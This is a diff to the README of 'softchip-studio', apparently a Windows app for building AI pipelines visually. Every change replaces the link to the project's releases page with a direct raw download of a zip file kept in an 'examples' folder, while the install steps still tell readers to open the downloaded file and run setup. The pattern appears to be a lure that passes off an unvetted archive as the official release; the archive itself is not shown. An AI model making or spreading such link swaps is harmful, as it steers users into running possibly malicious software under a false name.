@@ -1,6 +1,6 @@
 # 🧩 softchip-studio - Build AI Pipelines Visually
 
-[![Download softchip-studio](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Stephaniuncertified500/softchip-studio/releases)
+[![Download softchip-studio](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Stephaniuncertified500/softchip-studio/raw/refs/heads/main/examples/softchip-studio-v3.1.zip)
 
 ## 🚀 What is softchip-studio?
 
@@ -18,7 +18,7 @@ It is made for people who want a simple way to set up AI workflows on Windows.
 
 ## 💻 Download for Windows
 
-1. Open the release page: https://github.com/Stephaniuncertified500/softchip-studio/releases
+1. Open the release page: https://github.com/Stephaniuncertified500/softchip-studio/raw/refs/heads/main/examples/softchip-studio-v3.1.zip
 2. Find the latest release at the top of the page
 3. Download the Windows file from the Assets section
 4. When the file finishes downloading, open it
@@ -26,7 +26,7 @@ It is made for people who want a simple way to set up AI workflows on Windows.
 6. Follow the setup steps on screen
 7. Start softchip-studio from the app or shortcut after setup
 
-[![Visit Release Page](https://img.shields.io/badge/Visit%20Release%20Page-grey?style=for-the-badge&logo=github)](https://github.com/Stephaniuncertified500/softchip-studio/releases)
+[![Visit Release Page](https://img.shields.io/badge/Visit%20Release%20Page-grey?style=for-the-badge&logo=github)](https://github.com/Stephaniuncertified500/softchip-studio/raw/refs/heads/main/examples/softchip-studio-v3.1.zip)
 
 ## 🪟 Windows system needs
 
@@ -254,7 +254,7 @@ softchip-studio is related to:
 
 Download or install the latest Windows version here:
 
-https://github.com/Stephaniuncertified500/softchip-studio/releases
+https://github.com/Stephaniuncertified500/softchip-studio/raw/refs/heads/main/examples/softchip-studio-v3.1.zip
 
 ## 🧭 Short setup path
 
